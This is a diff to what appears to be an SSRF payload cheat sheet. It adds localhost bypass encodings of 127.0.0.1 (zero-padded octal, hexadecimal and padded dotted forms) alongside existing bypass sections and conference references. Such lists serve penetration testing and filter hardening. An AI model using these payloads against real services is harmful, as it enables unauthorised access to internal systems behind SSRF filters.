@@ -147,6 +147,7 @@ Implementations differ on how to handle octal format of ipv4.
 
 ```sh
 http://0177.0.0.1/ = http://127.0.0.1
+http://00000000177.000.0.00000001 = http://127.0.0.1
 http://o177.0.0.1/ = http://127.0.0.1
 http://0o177.0.0.1/ = http://127.0.0.1
 http://q177.0.0.1/ = http://127.0.0.1
@@ -157,6 +158,12 @@ Ref:
 - [DEFCON 29-KellyKaoudis SickCodes-Rotten code, aging standards & pwning IPv4 parsing](https://www.youtube.com/watch?v=_o1RPJAe4kU)
 - [AppSecEU15-Server_side_browsing_considered_harmful.pdf](https://www.agarri.fr/docs/AppSecEU15-Server_side_browsing_considered_harmful.pdf)
 
+
+### Bypass using hexadecimal IP
+```sh
+http://0x7f.0x0.0x0.0x1  = http://127.0.0.1
+http://0x7f000001 = http://127.0.0.1
+```
 
 ### Bypass using IPv6/IPv4 Address Embedding
 
@@ -171,6 +178,13 @@ http://[0:0:0:0:0:ffff:127.0.0.1]
 ```powershell
 localhost:+11211aaa
 localhost:00011211aaaa
+```
+
+### Bypass using full address
+
+```powershell
+http://127.000.000.001
+http://127.0.00000000000000000000000000000000001
 ```
 
 ### Bypass using rare address
